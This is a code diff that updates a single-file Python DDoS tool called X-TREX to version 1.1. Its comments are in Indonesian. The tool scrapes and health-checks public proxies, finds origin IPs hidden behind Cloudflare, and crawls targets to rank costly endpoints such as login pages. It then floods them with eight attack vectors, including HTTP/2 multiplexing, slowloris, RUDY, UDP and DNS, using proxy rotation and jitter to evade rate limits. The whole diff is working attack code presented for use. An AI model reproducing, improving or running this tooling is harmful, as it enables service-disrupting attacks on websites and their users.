@@ -1,15 +1,7 @@
 #!/usr/bin/env python3
 # language: Python 3, file: xtrex.py, runtime: Termux / Linux / macOS
-# X-TREX — single file, stdlib only, zero import errors.
-# python xtrex.py  →  menu cyber X-TREX.
-#
-# Fitur:
-#   • Auto proxy scraper + health-check + cache
-#   • Endpoint hunter — crawl target, skor endpoint mahal
-#   • Origin IP finder — crt.sh + subdomain probe, filter Cloudflare
-#   • 8 vektor flood: http/h2/slow/ruddy/tcp/udp/dns/mixed
-#   • Proxy rotation + endpoint rotation per request
-#   • Multi-profile config persist ke xtrex.json
+# X-TREX v1.1 — single file, stdlib only, zero import errors.
+# Semua fitur aktif: 8 vektor, proxy auto-heal, endpoint hunter, origin finder.
 
 import os, sys, json, time, socket, ssl, struct, random, string, threading, re, ipaddress
 import urllib.request, urllib.error
@@ -17,20 +9,23 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import deque
 from urllib.parse import urlparse, urljoin
 
-# ─── warna ANSI ────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# WARNA
+# ═══════════════════════════════════════════════════════════════════
 class C:
     R="\033[0m"; B="\033[1m"; D="\033[2m"
     G="\033[92m"; Cy="\033[96m"; Y="\033[93m"
     Rd="\033[91m"; Mg="\033[95m"; Bl="\033[94m"; W="\033[97m"
 
-# ─── paths ─────────────────────────────────────────────────
-BASE = os.path.dirname(os.path.abspath(__file__))
+# ═══════════════════════════════════════════════════════════════════
+# PATHS & CONFIG
+# ═══════════════════════════════════════════════════════════════════
+BASE         = os.path.dirname(os.path.abspath(__file__))
 CFG_FILE     = os.path.join(BASE, "xtrex.json")
 PROXY_CACHE  = os.path.join(BASE, "xtrex-proxies.txt")
 ENDPOINT_FILE= os.path.join(BASE, "xtrex-endpoints.txt")
 LOG_DIR      = os.path.join(BASE, "xtrex-logs")
 
-# ─── default config ────────────────────────────────────────
 DEFAULTS = {
     "host": "", "port": 80, "tls": False, "path": "/",
     "threads": 50, "duration": 60,
@@ -43,7 +38,10 @@ CFG = dict(DEFAULTS)
 
 
 def _ensure_dirs():
-    os.makedirs(LOG_DIR, exist_ok=True)
+    try:
+        os.makedirs(LOG_DIR, exist_ok=True)
+    except Exception:
+        pass
 
 
 def load_cfg():
@@ -80,8 +78,9 @@ def save_cfg():
     except Exception:
         pass
 
-
-# ─── utility ───────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# UTILS
+# ═══════════════════════════════════════════════════════════════════
 def rstr(n):
     return "".join(random.choices(string.ascii_letters + string.digits, k=n))
 
@@ -101,7 +100,7 @@ def log_session(line):
 
 
 def parse_url(s):
-    s = s.strip()
+    s = (s or "").strip()
     if not s:
         return "", 80, False, "/"
     if "://" not in s:
@@ -110,17 +109,22 @@ def parse_url(s):
             if p.isdigit():
                 return h, int(p), int(p) == 443, "/"
         return s, 80, False, "/"
-    p = urlparse(s)
-    host = p.hostname or p.netloc
-    tls = p.scheme == "https"
-    port = p.port or (443 if tls else 80)
-    path = p.path or "/"
-    if p.query:
-        path += "?" + p.query
-    return host, port, tls, path
+    try:
+        p = urlparse(s)
+        host = p.hostname or p.netloc
+        tls = p.scheme == "https"
+        port = p.port or (443 if tls else 80)
+        path = p.path or "/"
+        if p.query:
+            path += "?" + p.query
+        return host, port, tls, path
+    except Exception:
+        return s, 80, False, "/"
 
 
 def resolve(host):
+    if not host:
+        return []
     try:
         return list({i[4][0] for i in socket.getaddrinfo(host, None, socket.AF_INET)})
     except Exception:
@@ -128,18 +132,6 @@ def resolve(host):
             return list({i[4][0] for i in socket.getaddrinfo(host, None, socket.AF_INET6)})
         except Exception:
             return []
-
-
-# ─── proxy: scrape + health check + cache ──────────────────
-PROXY_SOURCES = [
-    ("http",   "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
-    ("http",   "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
-    ("http",   "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt"),
-    ("http",   "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"),
-    ("socks5", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"),
-    ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
-    ("socks5", "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt"),
-]
 
 
 def _http_get(url, timeout=15):
@@ -150,28 +142,71 @@ def _http_get(url, timeout=15):
     except Exception:
         return ""
 
+# ═══════════════════════════════════════════════════════════════════
+# PROXY — blacklist + scrape + health check
+# ═══════════════════════════════════════════════════════════════════
+PROXY_BLACKLIST = set()
+PROXY_BL_LOCK = threading.Lock()
+
+
+def proxy_is_dead(p):
+    with PROXY_BL_LOCK:
+        return p in PROXY_BLACKLIST
+
+
+def proxy_mark_dead(p):
+    with PROXY_BL_LOCK:
+        PROXY_BLACKLIST.add(p)
+
+
+def proxy_live_pool(proxies):
+    return [p for p in proxies if not proxy_is_dead(p)]
+
+
+def proxy_clear_blacklist():
+    with PROXY_BL_LOCK:
+        PROXY_BLACKLIST.clear()
+
+
+PROXY_SOURCES = [
+    ("http",   "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
+    ("http",   "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
+    ("http",   "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt"),
+    ("http",   "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"),
+    ("http",   "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"),
+    ("socks5", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"),
+    ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
+    ("socks5", "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt"),
+    ("socks5", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
+]
+
 
 def scrape_proxies(verbose=True):
-    """Ambil dari semua sumber, dedup, return list (kind, host, port)."""
     seen = set()
     out = []
     for kind, url in PROXY_SOURCES:
         if verbose:
-            sys.stdout.write(f"\r  {C.D}scraping {kind}: {url.split('/')[-1][:40]}…{C.R}  ")
+            sys.stdout.write(f"\r  {C.D}scrape {kind}: {url.split('/')[-1][:35]:<35}{C.R}  ")
             sys.stdout.flush()
         text = _http_get(url)
         if not text:
             continue
         for line in text.splitlines():
             line = line.strip()
-            if not line or line.startswith("#") or ":" not in line:
+            if not line or line.startswith("#"):
+                continue
+            if "://" in line:
+                line = line.split("://", 1)[1]
+            if ":" not in line:
                 continue
             try:
                 h, p = line.rsplit(":", 1)
                 p = int(p)
                 if not (1 <= p <= 65535):
                     continue
-                key = f"{kind}:{h}:{p}"
+                if not h or len(h) > 100:
+                    continue
+                key = f"{kind}://{h}:{p}"
                 if key in seen:
                     continue
                 seen.add(key)
@@ -179,32 +214,43 @@ def scrape_proxies(verbose=True):
             except Exception:
                 continue
     if verbose:
-        print(f"\r  {C.G}»  {len(out)} proxy mentah terkumpul{C.R}                    ")
+        print(f"\r  {C.G}»  {len(out)} proxy mentah{C.R}                                        ")
     return out
 
 
-def check_proxy(proxy, timeout=3):
-    """Tes cepat — TCP connect + minimal handshake sesuai jenis proxy."""
+def check_proxy(proxy, timeout=4):
+    """End-to-end test — SOCKS5 greeting + CONNECT ke 1.1.1.1:443."""
     kind, host, port = proxy
+    sock = None
     try:
         sock = socket.create_connection((host, port), timeout=timeout)
         sock.settimeout(timeout)
         if kind == "socks5":
             sock.sendall(b"\x05\x01\x00")
             r = sock.recv(2)
-            ok = r == b"\x05\x00"
-        else:  # http
-            sock.sendall(b"CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org:443\r\n\r\n")
-            r = sock.recv(64)
-            ok = b"200" in r.split(b"\r\n")[0] if r else False
-        sock.close()
-        return ok
+            if r != b"\x05\x00":
+                return False
+            sock.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("1.1.1.1") + (443).to_bytes(2, "big"))
+            r = sock.recv(10)
+            if len(r) < 2 or r[1] != 0:
+                return False
+            return True
+        else:
+            sock.sendall(b"CONNECT 1.1.1.1:443 HTTP/1.1\r\nHost: 1.1.1.1:443\r\n\r\n")
+            r = sock.recv(128)
+            if not r:
+                return False
+            first = r.split(b"\r\n")[0]
+            return b"200" in first
     except Exception:
         return False
+    finally:
+        if sock:
+            try: sock.close()
+            except Exception: pass
 
 
 def check_proxies_parallel(proxies, workers=60, verbose=True):
-    """Tes paralel, kembalikan list proxy yang hidup."""
     if not proxies:
         return []
     alive = []
@@ -215,13 +261,12 @@ def check_proxies_parallel(proxies, workers=60, verbose=True):
             futs = {ex.submit(check_proxy, p): p for p in proxies}
             for f in as_completed(futs):
                 done += 1
-                p = futs[f]
                 try:
                     if f.result():
-                        alive.append(p)
+                        alive.append(futs[f])
                 except Exception:
                     pass
-                if verbose and done % 20 == 0:
+                if verbose and done % 25 == 0:
                     sys.stdout.write(
                         f"\r  {C.D}cek {done}/{total}  hidup {C.G}{len(alive)}{C.R}  "
                     )
@@ -229,7 +274,7 @@ def check_proxies_parallel(proxies, workers=60, verbose=True):
     except Exception:
         pass
     if verbose:
-        print(f"\r  {C.G}»  {len(alive)}/{total} proxy hidup{C.R}                    ")
+        print(f"\r  {C.G}»  {len(alive)}/{total} proxy hidup{C.R}                                        ")
     return alive
 
 
@@ -267,7 +312,6 @@ def load_proxies_cached():
 
 
 def get_proxies(force_refresh=False, verbose=True):
-    """Cache-first → scrape → check → save. Return list proxy hidup."""
     if not force_refresh:
         cached = load_proxies_cached()
         if cached:
@@ -275,7 +319,7 @@ def get_proxies(force_refresh=False, verbose=True):
                 print(f"  {C.D}cache: {len(cached)} proxy, cek hidup…{C.R}")
             return check_proxies_parallel(cached, verbose=verbose)
     if verbose:
-        print(f"  {C.D}scraping proxy sumber publik…{C.R}")
+        print(f"  {C.D}scraping sumber proxy publik…{C.R}")
     raw = scrape_proxies(verbose=verbose)
     if not raw:
         return []
@@ -286,8 +330,9 @@ def get_proxies(force_refresh=False, verbose=True):
         save_proxies(alive)
     return alive
 
-
-# ─── origin IP finder (Cloudflare bypass) ──────────────────
+# ═══════════════════════════════════════════════════════════════════
+# ORIGIN FINDER
+# ═══════════════════════════════════════════════════════════════════
 CF_RANGES = [
     "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
     "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
@@ -311,37 +356,24 @@ def is_cf(ip):
         return False
 
 
-def crt_subdomains(domain, verbose=True):
-    """Query crt.sh untuk subdomain, filter wildcard."""
-    if verbose:
-        sys.stdout.write(f"\r  {C.D}query crt.sh untuk *.domain…{C.R}                    ")
-        sys.stdout.flush()
-    url = f"https://crt.sh/?q=%25.{domain}&output=json"
-    text = _http_get(url, timeout=20)
-    if not text:
-        return set()
-    try:
-        data = json.loads(text)
-    except Exception:
-        return set()
-    names = set()
-    for entry in data:
-        for name in entry.get("name_value", "").split("\n"):
-            name = name.strip().lower().lstrip("*.")
-            if name and name != domain and name.endswith(domain):
-                names.add(name)
-    if verbose:
-        print(f"\r  {C.G}»  {len(names)} subdomain dari crt.sh{C.R}                    ")
-    return names
-
-
 def find_origin(domain, verbose=True):
-    """crt.sh + resolusi subdomain, filter IP Cloudflare."""
-    subs = crt_subdomains(domain, verbose=verbose)
-    # fallback: probe common subdomains
+    if verbose:
+        sys.stdout.write(f"\r  {C.D}query crt.sh…{C.R}                              ")
+        sys.stdout.flush()
+    subs = set()
+    text = _http_get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=25)
+    if text:
+        try:
+            for entry in json.loads(text):
+                for name in entry.get("name_value", "").split("\n"):
+                    name = name.strip().lower().lstrip("*.")
+                    if name and name.endswith(domain):
+                        subs.add(name)
+        except Exception:
+            pass
     for pfx in ("direct", "origin", "ftp", "mail", "smtp", "vpn",
                 "dev", "staging", "stage", "test", "beta", "admin",
-                "ssh", "api", "app", "backend"):
+                "ssh", "api", "app", "backend", "old", "new", "server"):
         subs.add(f"{pfx}.{domain}")
     subs.add(domain)
 
@@ -352,20 +384,22 @@ def find_origin(domain, verbose=True):
     for sub in subs:
         done += 1
         if verbose and done % 5 == 0:
-            sys.stdout.write(f"\r  {C.D}resolve {done}/{total}  non-CF: {len(non_cf)}{C.R}  ")
+            sys.stdout.write(
+                f"\r  {C.D}resolve {done}/{total}  non-CF: {len(non_cf)}{C.R}          "
+            )
             sys.stdout.flush()
-        ips = resolve(sub)
-        for ip in ips:
+        for ip in resolve(sub):
             if is_cf(ip):
                 cf[sub] = ip
             else:
                 non_cf.setdefault(sub, []).append(ip)
     if verbose:
-        print(f"\r  {C.G}»  {len(non_cf)} host non-Cloudflare, {len(cf)} via CF{C.R}                    ")
+        print(f"\r  {C.G}»  {len(non_cf)} host non-CF, {len(cf)} via CF{C.R}                    ")
     return non_cf, cf
 
-
-# ─── endpoint hunter ───────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# ENDPOINT HUNTER
+# ═══════════════════════════════════════════════════════════════════
 SKOR_KW = {
     "login":10,"signin":10,"auth":10,"oauth":10,"register":9,"signup":9,
     "password":8,"reset":8,"verify":8,"otp":8,"2fa":8,"token":7,
@@ -433,24 +467,19 @@ def hunt_endpoints(host, tls, verbose=True, max_pages=25):
         sys.stdout.write(f"\r  {C.D}ambil sitemap + robots…{C.R}                    ")
         sys.stdout.flush()
 
-    # sitemap & robots
-    extra = set()
     for sm in ("/sitemap.xml", "/sitemap_index.xml", "/robots.txt"):
         body, st = _fetch_hunt(base + sm)
         if st == 200 and body:
             if sm.endswith(".xml"):
                 for loc in RE_SMLOC.findall(body):
-                    extra.add(loc.strip())
+                    queue.append(loc.strip())
             else:
                 for line in body.splitlines():
                     if line.lower().startswith("sitemap:"):
                         sb, sst = _fetch_hunt(line.split(":", 1)[1].strip())
                         if sst == 200:
                             for loc in RE_SMLOC.findall(sb):
-                                extra.add(loc.strip())
-    for u in extra:
-        if u.startswith("http"):
-            queue.append(u)
+                                queue.append(loc.strip())
 
     if verbose:
         sys.stdout.write(f"\r  {C.D}crawl {max_pages} halaman…{C.R}                    ")
@@ -483,7 +512,6 @@ def hunt_endpoints(host, tls, verbose=True, max_pages=25):
             if sc > 0:
                 skor_map[path] = max(skor_map.get(path, 0), sc)
 
-    # API probe kalau kering
     probes = ["/api", "/api/v1", "/graphql", "/api/graphql",
               "/api/login", "/api/search", "/api/users", "/search",
               "/login", "/register", "/download", "/export", "/admin"]
@@ -528,8 +556,9 @@ def load_endpoints(top=10):
         return []
     return out[:top] if top else out
 
-
-# ─── stats ─────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# STATS
+# ═══════════════════════════════════════════════════════════════════
 class Stats:
     def __init__(self):
         self.lock = threading.Lock()
@@ -590,8 +619,9 @@ class Stats:
             self.th.join(timeout=2)
         print()
 
-
-# ─── context untuk worker ──────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# CONTEXT
+# ═══════════════════════════════════════════════════════════════════
 class Ctx:
     def __init__(self, cfg, ips, proxies, endpoints, stats, stop):
         self.cfg = cfg
@@ -606,15 +636,19 @@ class Ctx:
             return
         lo = self.cfg.get("stealth_min_ms", 20) / 1000.0
         hi = self.cfg.get("stealth_max_ms", 200) / 1000.0
-        time.sleep(random.uniform(lo, hi))
+        try:
+            time.sleep(random.uniform(lo, hi))
+        except Exception:
+            pass
 
     def pick_path(self):
         if self.endpoints:
             return random.choice(self.endpoints)
         return self.cfg["path"]
 
-
-# ─── UA pool ───────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# UA & REF
+# ═══════════════════════════════════════════════════════════════════
 UA_POOL = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
@@ -623,12 +657,12 @@ UA_POOL = [
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
 ]
-
 REFS = ["https://www.google.com/", "https://www.bing.com/",
         "https://duckduckgo.com/", "https://t.co/", "https://www.facebook.com/"]
 
-
-# ─── koneksi & proxy hop ───────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# NETWORK
+# ═══════════════════════════════════════════════════════════════════
 def direct_connect(ip, port, tls, host, timeout=6):
     sock = socket.create_connection((ip, port), timeout=timeout)
     if tls:
@@ -637,37 +671,62 @@ def direct_connect(ip, port, tls, host, timeout=6):
     return sock
 
 
-def via_proxy(proxy, host, port, tls, timeout=8):
+def via_proxy(proxy, host, port, tls, timeout=8, alpn=None):
     kind, ph, pp = proxy
     sock = socket.create_connection((ph, pp), timeout=timeout)
     sock.settimeout(timeout)
     if kind == "http":
-        sock.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
+        sock.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
         resp = sock.recv(1024)
-        if b"200" not in resp.split(b"\r\n")[0]:
+        if not resp or b"200" not in resp.split(b"\r\n")[0]:
             sock.close()
-            raise ConnectionError("proxy CONNECT denied")
+            raise ConnectionError("http proxy refused")
         if tls:
             ctx = ssl._create_unverified_context()
+            if alpn:
+                try: ctx.set_alpn_protocols(alpn)
+                except Exception: pass
             sock = ctx.wrap_socket(sock, server_hostname=host)
         return sock
     if kind == "socks5":
         sock.sendall(b"\x05\x01\x00")
-        if sock.recv(2) != b"\x05\x00":
+        greeting = sock.recv(2)
+        if greeting == b"\x05\x02":
             sock.close()
-            raise ConnectionError("socks5 auth")
+            raise ConnectionError("socks5 requires auth")
+        if greeting != b"\x05\x00":
+            sock.close()
+            raise ConnectionError("socks5 bad greeting")
         hb = host.encode()
         sock.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + port.to_bytes(2, "big"))
         resp = sock.recv(10)
-        if len(resp) < 10 or resp[1] != 0:
+        if len(resp) < 2 or resp[1] != 0:
             sock.close()
-            raise ConnectionError("socks5 connect")
+            raise ConnectionError(f"socks5 connect rc={resp[1] if len(resp) > 1 else -1}")
         if tls:
             ctx = ssl._create_unverified_context()
+            if alpn:
+                try: ctx.set_alpn_protocols(alpn)
+                except Exception: pass
             sock = ctx.wrap_socket(sock, server_hostname=host)
         return sock
     sock.close()
     raise ValueError(f"unknown proxy kind {kind}")
+
+
+def _connect_target(ctx, alpn=None):
+    """Proxy dulu, fallback direct. Proxy mati masuk blacklist otomatis."""
+    cfg = ctx.cfg
+    if ctx.proxies:
+        pool = proxy_live_pool(ctx.proxies)
+        if pool:
+            proxy = random.choice(pool)
+            try:
+                return via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"], alpn=alpn), "proxy"
+            except Exception:
+                proxy_mark_dead(proxy)
+    ip = random.choice(ctx.ips)
+    return direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"]), "direct"
 
 
 def build_http_request(ctx):
@@ -680,9 +739,9 @@ def build_http_request(ctx):
         mode = cfg.get("payload_mode", "rand")
         size = min(cfg.get("udp_size", 1024), 4096)
         if mode == "json":
-            body = b'{"k":"' + rstr(size // 2).encode() + b'"}'
+            body = b'{"k":"' + rstr(max(2, size // 2)).encode() + b'"}'
         elif mode == "form":
-            body = b"k=" + rstr(size // 2).encode()
+            body = b"k=" + rstr(max(2, size // 2)).encode()
         else:
             body = os.urandom(size)
     hdr = (
@@ -699,23 +758,18 @@ def build_http_request(ctx):
         f"Cookie: s={rstr(24)}; _ga=GA{rstr(10)}\r\n"
     ).encode()
     if body:
-        hdr += f"Content-Type: {'application/json' if cfg.get('payload_mode')=='json' else 'application/x-www-form-urlencoded'}\r\n".encode()
-        hdr += f"Content-Length: {len(body)}\r\n".encode()
+        ct = "application/json" if cfg.get("payload_mode") == "json" else "application/x-www-form-urlencoded"
+        hdr += f"Content-Type: {ct}\r\nContent-Length: {len(body)}\r\n".encode()
     hdr += b"\r\n" + body
     return hdr
 
-
-# ─── workers ───────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# WORKERS
+# ═══════════════════════════════════════════════════════════════════
 def worker_http(ctx):
-    cfg = ctx.cfg
     while not ctx.stop.is_set():
         try:
-            proxy = random.choice(ctx.proxies) if ctx.proxies else None
-            if proxy:
-                s = via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"])
-            else:
-                ip = random.choice(ctx.ips)
-                s = direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"])
+            s, _ = _connect_target(ctx)
             req = build_http_request(ctx)
             s.sendall(req)
             ctx.stats.bump(len(req), True)
@@ -727,7 +781,6 @@ def worker_http(ctx):
             ctx.stats.bump(0, False, e)
 
 
-# HTTP/2
 H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
 
 def _h2_frame(t, flags, sid, payload):
@@ -758,20 +811,13 @@ def _h2_block(ctx):
 
 
 def worker_h2(ctx):
-    cfg = ctx.cfg
-    ctx_tls = ssl._create_unverified_context()
-    ctx_tls.set_alpn_protocols(["h2"])
     while not ctx.stop.is_set():
         try:
-            proxy = random.choice(ctx.proxies) if ctx.proxies else None
-            if proxy:
-                s = via_proxy(proxy, cfg["host"], cfg["port"], True)
-                # note: proxy CONNECT + TLS, but ALPN negotiation happens inside via_proxy
-            else:
-                raw = socket.create_connection((random.choice(ctx.ips), cfg["port"]), timeout=5)
-                s = ctx_tls.wrap_socket(raw, server_hostname=cfg["host"])
+            s, _ = _connect_target(ctx, alpn=["h2"])
             if s.selected_alpn_protocol() != "h2":
-                s.close(); continue
+                try: s.close()
+                except Exception: pass
+                continue
             s.sendall(H2_PREFACE + _h2_frame(0x4, 0x0, 0, b""))
             ctx.stats.bump(len(H2_PREFACE) + 9, True)
             for i in range(random.randint(15, 40)):
@@ -781,7 +827,8 @@ def worker_h2(ctx):
                 blk = _h2_block(ctx)
                 s.sendall(_h2_frame(0x1, 0x5, sid, blk))
                 ctx.stats.bump(9 + len(blk), True)
-            s.close()
+            try: s.close()
+            except Exception: pass
         except Exception as e:
             ctx.stats.bump(0, False, e)
 
@@ -791,12 +838,7 @@ def worker_slow(ctx):
     pool = []
     while not ctx.stop.is_set():
         try:
-            proxy = random.choice(ctx.proxies) if ctx.proxies else None
-            if proxy:
-                s = via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"])
-            else:
-                ip = random.choice(ctx.ips)
-                s = direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"])
+            s, _ = _connect_target(ctx)
             path = ctx.pick_path()
             sep = "&" if "?" in path else "?"
             s.sendall(
@@ -815,12 +857,12 @@ def worker_slow(ctx):
             except Exception:
                 try: pool.remove(s)
                 except ValueError: pass
-        # cap pool per thread
         if len(pool) > 50:
             for s in pool[:20]:
                 try: s.close()
                 except Exception: pass
-                pool.remove(s)
+                try: pool.remove(s)
+                except ValueError: pass
         time.sleep(random.uniform(2, 5))
 
 
@@ -828,12 +870,7 @@ def worker_ruddy(ctx):
     cfg = ctx.cfg
     while not ctx.stop.is_set():
         try:
-            proxy = random.choice(ctx.proxies) if ctx.proxies else None
-            if proxy:
-                s = via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"])
-            else:
-                ip = random.choice(ctx.ips)
-                s = direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"])
+            s, _ = _connect_target(ctx)
             path = ctx.pick_path()
             total = random.randint(200_000, 800_000)
             s.sendall(
@@ -850,25 +887,21 @@ def worker_ruddy(ctx):
                 ctx.stats.bump(len(chunk), True)
                 sent += len(chunk)
                 time.sleep(random.uniform(0.4, 1.6))
-            s.close()
+            try: s.close()
+            except Exception: pass
         except Exception as e:
             ctx.stats.bump(0, False, e)
             time.sleep(0.8)
 
 
 def worker_tcp(ctx):
-    cfg = ctx.cfg
     while not ctx.stop.is_set():
         try:
-            proxy = random.choice(ctx.proxies) if ctx.proxies else None
-            if proxy:
-                s = via_proxy(proxy, cfg["host"], cfg["port"], cfg["tls"])
-            else:
-                ip = random.choice(ctx.ips)
-                s = direct_connect(ip, cfg["port"], cfg["tls"], cfg["host"])
+            s, _ = _connect_target(ctx)
             s.sendall(b"\x00" * 64)
             ctx.stats.bump(64, True)
-            s.close()
+            try: s.close()
+            except Exception: pass
         except Exception as e:
             ctx.stats.bump(0, False, e)
 
@@ -916,23 +949,23 @@ WORKERS = {
     "dns": worker_dns,
 }
 
+
 def pick_worker(name, ctx):
     if name in WORKERS:
         return threading.Thread(target=WORKERS[name], args=(ctx,), daemon=True)
     if name == "mixed":
-        pil = list(WORKERS.keys())
-        return pick_worker(random.choice(pil), ctx)
+        return pick_worker(random.choice(list(WORKERS.keys())), ctx)
     raise ValueError(f"vektor tidak dikenal: {name}")
 
-
-# ─── fire ──────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# FIRE — orkestrasi satu sesi flood
+# ═══════════════════════════════════════════════════════════════════
 def fire(sess, metode):
     cfg = sess["cfg"]
     if not cfg["host"]:
         print(f"  {C.Rd}[!] target kosong{C.R}")
         input(f"  {C.D}enter…{C.R}"); return
 
-    # resolve target
     print(f"\n  {C.D}resolve {cfg['host']}…{C.R}")
     ips = resolve(cfg["host"])
     if not ips:
@@ -940,28 +973,25 @@ def fire(sess, metode):
         input(f"  {C.D}enter…{C.R}"); return
     print(f"  {C.G}»  {len(ips)} IP: {', '.join(ips[:4])}{' …' if len(ips) > 4 else ''}{C.R}")
 
-    # proxies
     proxies = []
     if cfg.get("use_proxies"):
         print()
         proxies = get_proxies()
         if not proxies:
             print(f"  {C.Y}[!] proxy kosong — flood direct dari IP lokal{C.R}")
+        else:
+            proxy_clear_blacklist()
 
-    # endpoints
     endpoints = []
     if cfg.get("use_endpoints") and os.path.exists(ENDPOINT_FILE):
         endpoints = load_endpoints(top=10)
         if endpoints:
             print(f"  {C.G}»  {len(endpoints)} endpoint mahal di-load{C.R}")
-        else:
-            print(f"  {C.Y}[!] endpoints.txt kosong — pakai path default{C.R}")
 
     stats = Stats()
     stop = threading.Event()
     ctx = Ctx(cfg, ips, proxies, endpoints, stats, stop)
 
-    # pre-banner
     cls()
     print(C.Cy + C.B + f"""
   ╔══════════════════════════════════════════════════════╗
@@ -1008,8 +1038,9 @@ def fire(sess, metode):
     )
     input(f"\n  {C.D}enter untuk kembali…{C.R}")
 
-
-# ─── UI helpers ────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# UI HELPERS
+# ═══════════════════════════════════════════════════════════════════
 def banner(sub="menu utama"):
     cls()
     print(C.Cy + C.B + r"""
@@ -1019,12 +1050,8 @@ def banner(sub="menu utama"):
     ██╔██╗   ╚══╝   ██║   ██╔══██╗██╔══╝   ██╔██╗
    ██╔╝ ██╗         ██║   ██║  ██║███████╗██╔╝ ██╗
    ╚═╝  ╚═╝         ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝""" + C.R)
-    print(C.Mg + f"           x-trex v1.0 · {sub}" + C.R)
+    print(C.Mg + f"           x-trex v1.1 · {sub}" + C.R)
     print(C.D  + "           " + "─" * 46 + C.R)
-
-
-def h1(text):
-    print(C.Cy + C.B + f"\n  ── {text} ──\n" + C.R)
 
 
 def info(k, v):
@@ -1032,16 +1059,21 @@ def info(k, v):
 
 
 def ask(text, default=""):
-    if default != "":
-        v = input(f"  {C.Y}{text}{C.R} {C.D}[{default}]{C.R}: ").strip()
-        return v if v else str(default)
-    return input(f"  {C.Y}{text}{C.R}: ").strip()
+    try:
+        if default != "" and default is not None:
+            v = input(f"  {C.Y}{text}{C.R} {C.D}[{default}]{C.R}: ").strip()
+            return v if v else str(default)
+        return input(f"  {C.Y}{text}{C.R}: ").strip()
+    except (EOFError, KeyboardInterrupt):
+        return str(default) if default != "" else ""
 
 
 def ask_int(text, default):
     v = ask(text, default)
-    try: return int(v)
-    except: return default
+    try:
+        return int(v)
+    except Exception:
+        return default
 
 
 def ask_bool(text, default=False):
@@ -1049,8 +1081,9 @@ def ask_bool(text, default=False):
     v = ask(f"{text} y/n", d).lower()
     return v in ("y", "ya", "yes", "1", "true")
 
-
-# ─── sub-menu vektor ───────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════
+# MENU VEKTOR
+# ═══════════════════════════════════════════════════════════════════
 VEKTOR = [
     ("1", "http",  "HTTP/1.1 Flood",     "GET/POST/HEAD · proxy + endpoint rotasi"),
     ("2", "h2",    "HTTP/2 Multiplex",   "ALPN h2 · 15-40 stream per koneksi"),
@@ -1059,7 +1092,7 @@ VEKTOR = [
     ("5", "tcp",   "TCP Connect Flood",  "3-way handshake terus-menerus"),
     ("6", "udp",   "UDP Flood",          "payload acak ukuran custom"),
     ("7", "dns",   "DNS Query Flood",    "label acak · A/ANY"),
-    ("8", "mixed", "Mixed Multi-Vector", "acak semua vektor non-root"),
+    ("8", "mixed", "Mixed Multi-Vector", "acak semua vektor"),
 ]
 VMAP = {k: m for k, m, _, _ in VEKTOR}
 VLABEL = {m: label for _, m, label, _ in VEKTOR}
@@ -1102,7 +1135,6 @@ def sub_vektor(sess, kode):
         cfg["stealth"] = ask_bool("stealth jitter (rate-limit evade)", cfg.get("stealth", False))
     save_cfg()
